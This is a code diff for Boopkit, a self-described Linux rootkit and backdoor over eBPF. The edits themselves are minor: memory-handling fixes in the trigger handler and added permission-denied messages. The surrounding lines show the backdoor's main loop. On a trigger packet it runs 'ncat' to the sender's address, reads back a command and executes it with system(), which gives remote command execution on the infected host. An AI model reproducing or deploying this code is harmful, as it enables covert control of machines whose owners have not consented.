@@ -63,11 +63,6 @@ void asciiheader() {
 }
 
 void usage(){
-  // Falco version: 0.29.1
-  // Usage: falco [options]
-  //
-  // Options:
-  // -h, --help                    Print this page
   printf("Boopkit version: %s\n", VERSION);
   printf("Linux rootkit and backdoor over eBPF.\n");
   printf("Author: Kris Nóva <kris@nivenly.com>\n");
@@ -78,7 +73,6 @@ void usage(){
   printf("-h, help           Display help and usage for boopkit.\n");
   printf("-x, ignore         Source addresses to reject triggers from.\n");
   printf("\n");
-
   exit(0);
 }
 
@@ -86,10 +80,8 @@ void usage(){
 // a triggered event. This is responsible for
 // finding whatever remote command will need to
 // be executed on the bookit exploited machine.
-char *handlerev(char dial[INET_ADDRSTRLEN]) {
+char *handlerev(char dial[INET_ADDRSTRLEN], char *recrce) {
   printf("  * Boop: %s\n ", dial);
-  char *recrce = malloc(MAX_RCE_SIZE);
-
   // -- Hacky implementation --
   char cmd[MAX_RCE_SIZE];
   sprintf(cmd, "ncat %s %d", dial, PORT);
@@ -103,7 +95,6 @@ char *handlerev(char dial[INET_ADDRSTRLEN]) {
     return recrce;
   }
   // -- Hacky implementation --
-  free(recrce);
   return recrce;
 }
 
@@ -153,6 +144,8 @@ int main(int argc, char **argv) {
   loaded = pr0be_safe__load(sfobj);
   if (loaded < 0) {
     printf("Unable to load eBPF object: %s\n", sfpath);
+    printf("Privileged acces required to load eBPF probe!\n");
+    printf("Permission denied.\n");
     return 1;
   }
   printf("  -> eBPF Probe loaded: %s\n", sfpath);
@@ -169,6 +162,8 @@ int main(int argc, char **argv) {
   bpobj = bpf_object__open(bppath);
   if (!bpobj) {
     printf("Unable to open eBPF object: %s\n", bppath);
+    printf("Privileged acces required to load eBPF probe!\n");
+    printf("Permission denied.\n");
     return 1;
   }
   loaded = bpf_object__load(bpobj);
@@ -236,11 +231,13 @@ int main(int argc, char **argv) {
       }
       if (!ignore) {
           char *rce;
-          rce = handlerev(saddrval);
-          printf(" <- %s\n", rce);
+          char *recrce = malloc(MAX_RCE_SIZE);
+          rce = handlerev(saddrval, recrce);
+          printf(" <- %s", rce);
           system(rce);
-          err = bpf_map_delete_elem(fd, &jkey);
+          free(recrce);
       }
+      err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
         return 0;
       }
